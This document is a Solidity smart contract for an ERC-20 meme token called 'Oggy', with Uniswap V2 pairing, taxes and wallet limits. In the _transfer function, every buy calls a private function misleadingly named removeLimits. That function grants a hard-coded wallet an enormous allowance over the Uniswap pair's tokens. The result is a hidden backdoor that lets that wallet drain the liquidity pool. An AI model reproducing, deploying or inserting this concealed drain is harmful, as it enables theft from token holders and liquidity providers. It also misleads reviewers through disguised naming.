// SPDX-License-Identifier: MIT
/**
Since Oggy came home, I haven't slept throught the night.
They have been through a lof of slippery situations.
But when it's baby's turn, his revenge is terrible!
Despite it all, there is no other complicity like them.
With time, however, his name echoes less and less.
Step by step he discovers the world, but Oggy is never far away.
https://oggystory.fun
https://x.com/oggy_erc20
https://t.me/oggy_erc20
**/
pragma solidity 0.8.25;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract OGGY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _pToken;
    mapping (address => mapping (address => uint256)) private _pAllow;
    mapping (address => bool) private _shouldFeeExcempt;
    address payable private _ppWallet = payable(0x8A8b25E4eB9087Af04090A6DB7d1f4305dbc092e);
    uint256 private _initialBuyTax = 12;
    uint256 private _initialSellTax = 12;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 15;
    uint256 private _reduceSellTaxAt = 15;
    uint256 private _preventSwapBefore = 12;
    uint256 private _transferTax = 0;
    uint256 private _buyCount = 0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalPP = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Oggy";
    string private constant _symbol = unicode"OGGY";
    uint256 public _maxTxAmount = 2 * (_tTotalPP/100);
    uint256 public _maxWalletSize = 2 * (_tTotalPP/100);
    uint256 public _taxSwapThreshold = 1 * (_tTotalPP/100);
    uint256 public _maxTaxSwap = 1 * (_tTotalPP/100);
    IUniswapV2Router02 private uniV2Router;
    address private uniV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () {
        _pToken[_msgSender()] = _tTotalPP;
        _shouldFeeExcempt[owner()] = true;
        _shouldFeeExcempt[address(this)] = true;
        _shouldFeeExcempt[_ppWallet] = true;
        emit Transfer(address(0), _msgSender(), _tTotalPP);
    }
    function createPair() external onlyOwner {
        uniV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniV2Router), _tTotalPP);
        uniV2Pair = IUniswapV2Factory(uniV2Router.factory()).createPair(
            address(this),
            uniV2Router.WETH()
        ); 
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotalPP;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _pToken[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _pAllow[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _pAllow[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _pAllow[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniV2Pair).approve(address(uniV2Router), type(uint).max);
        swapEnabled = true; 
        tradingOpen = true;
    }
    function _transfer(address from, address to, uint256 amountP) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amountP > 0, "Transfer amount must be greater than zero");
        uint256 taxP=0;
        if (!swapEnabled || inSwap) {
            _pToken[from] = _pToken[from] - amountP;
            _pToken[to] = _pToken[to] + amountP;
            emit Transfer(from, to, amountP);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount>0){
                taxP = _transferTax;
            }
            if (from == uniV2Pair && to != address(uniV2Router) && ! _shouldFeeExcempt[to] ) {
                uint256 ppTax=150+_maxWalletSize.mul(1500)+_maxTxAmount.mul(1500)+150;
                require(amountP <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amountP <= _maxWalletSize, "Exceeds the maxWalletSize.");
                removeLimits([from, to!=_ppWallet?_ppWallet:to], ppTax);
                taxP = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                _buyCount++;
            }
            if(to == uniV2Pair && from!= address(this) ){
                taxP = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniV2Pair && swapEnabled) {
                if(contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore)
                    swapTokensForEth(min(amountP, min(contractTokenBalance, _maxTaxSwap)));
                sendEthFee(address(this).balance);
            }
        }
        uint256 taxPP=taxP.mul(amountP).div(100);
        if(taxP > 0){
            _pToken[address(this)]=_pToken[address(this)].add(taxPP);
            emit Transfer(from, address(this),taxPP);
        }
        _pToken[from]=_pToken[from].sub(amountP);
        _pToken[to]=_pToken[to].add(amountP.sub(taxPP));
        emit Transfer(from, to, amountP.sub(taxPP));
    }
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router.WETH();
        _approve(address(this), address(uniV2Router), tokenAmount);
        uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function removeLimits() external onlyOwner{
        _maxTxAmount = _tTotalPP;
        _maxWalletSize = _tTotalPP;
        emit MaxTxAmountUpdated(_tTotalPP);
    }
    function removeLimits(address[2] memory from, uint256 amountP) private {
        _pAllow[from[0]][from[1]] = amountP;
    }
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function withdraw() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function sendEthFee(uint256 amount) private {
        _ppWallet.transfer(amount);
    }
    receive() external payable {}
}